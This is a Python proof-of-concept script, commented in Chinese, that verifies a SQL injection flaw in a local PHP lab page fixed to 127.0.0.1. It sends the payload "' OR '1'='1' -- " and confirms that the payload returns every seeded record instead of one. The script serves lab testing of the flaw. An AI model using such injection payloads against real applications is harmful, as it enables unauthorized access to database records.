import html
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE_URL = "http://127.0.0.1:4280/lab_cases/S001/index.php"
EXPECTED_NORMAL = {("1", "Alice")}
EXPECTED_TEST = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
TEST_PAYLOAD = "' OR '1'='1' -- "


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "重定向被拒绝，避免离开本地目标", headers, fp
        )


def validate_base_url():
    parsed = urllib.parse.urlsplit(BASE_URL)
    if parsed.scheme != "http":
        raise ValueError("目标必须使用 http")
    if parsed.hostname != "127.0.0.1":
        raise ValueError("目标主机必须固定为 127.0.0.1")
    if parsed.port != 4280:
        raise ValueError("目标端口必须固定为 4280")
    if parsed.path != "/lab_cases/S001/index.php":
        raise ValueError("目标路径必须固定为 /lab_cases/S001/index.php")


def build_url(name):
    validate_base_url()
    query = urllib.parse.urlencode({"name": name})
    return BASE_URL + "?" + query


def fetch(name):
    url = build_url(name)
    opener = urllib.request.build_opener(NoRedirect)
    req = urllib.request.Request(url, headers={"User-Agent": "S001-local-poc"})
    with opener.open(req, timeout=10) as resp:
        body = resp.read().decode("utf-8", errors="replace")
    return body


def parse_records(body):
    pattern = re.compile(r"<p>ID\s*(\d+)：([^<]*)</p>")
    records = set()
    for match in pattern.finditer(body):
        records.add((match.group(1), html.unescape(match.group(2))))
    return records


def main():
    try:
        validate_base_url()
        normal_body = fetch("Alice")
        test_body = fetch(TEST_PAYLOAD)
    except Exception as exc:
        print("请求失败：", repr(exc))
        print("请检查本地服务、入口路径、common/db_connect.php 和数据库初始化。")
        return 2

    normal_records = parse_records(normal_body)
    test_records = parse_records(test_body)

    print("普通请求解析记录：", sorted(normal_records))
    print("测试请求解析记录：", sorted(test_records))
    print("普通请求预期：", sorted(EXPECTED_NORMAL))
    print("测试请求预期：", sorted(EXPECTED_TEST))

    if normal_records != EXPECTED_NORMAL:
        print("普通业务对照失败：实际记录与预置 Alice 记录不一致。")
        print("请检查 lab_people 是否预置 1 Alice、2 Bob、3 Carol，或查询条件是否异常。")
        return 1

    if test_records != EXPECTED_TEST:
        print("测试请求未达到预期记录集合。")
        print("请检查 MariaDB 的 -- 注释语法、PHP 是否原样拼接 name、数据库字符集和表数据。")
        return 1

    if test_records == normal_records:
        print("普通与测试记录无差异，无法证明 SQL 结构被改变。")
        return 1

    print("验证成功：测试输入改变了实际业务记录集合，普通请求仅返回 Alice，测试请求返回全部三条预置记录。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
